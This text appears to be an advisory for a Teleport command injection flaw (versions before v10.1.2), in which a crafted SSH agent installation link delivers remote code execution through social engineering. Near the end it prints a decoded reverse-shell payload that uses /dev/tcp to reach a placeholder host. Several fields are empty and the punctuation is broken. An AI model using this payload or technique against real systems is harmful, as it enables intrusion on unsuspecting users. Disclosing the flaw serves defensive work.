An attacker can craft a malicious ssh agent ， installation link by URL encoding a bash escape with carriage return ， line feed. This url encoded payload can be used in place of a token and ， sent to a user in a social engineering attack. This is fully ， unauthenticated attack utilizing the trusted teleport server to deliver ， the payload. ， Additional Information :  ， Vulnerability Type : otherCommand injection leading to Remote Code Execution ， Vendor of Product : Teleport - ， Affected software version : Teleport version < v10.1.2 ， Affected Component : < ， Attack Type : Remote ， Impact : Code Execution ， Impact Other : This vulnerability allows an attacker to inject code into a bash script without authentication , and craft a legitimate link hosted on the teleport server to use in social engineering attacks. When a user executes the command to install an teleport SSH agent with the crafted link , it will install the teleport agent and without the users knowledge , execute malicious code in the background. ， Attack Vectors : An attacker can craft a malicious ssh agent installation link by URL encoding a bash escape with carriage return line feed. This url encoded payload can be used in place of a token and sent to a user in a social engineering attack. This is fully unauthenticated attack utilizing the trusted teleport server to deliver the payload. ， Example POC payload : < ， Decoded payload :  ， \" ， /bin/bash -l > /dev/tcp/10.0.0.1/5555 0<&1 2>&1 #  ， Patch information :  ， Discoverers :  ， Brandon Roach & Brian Landrum",
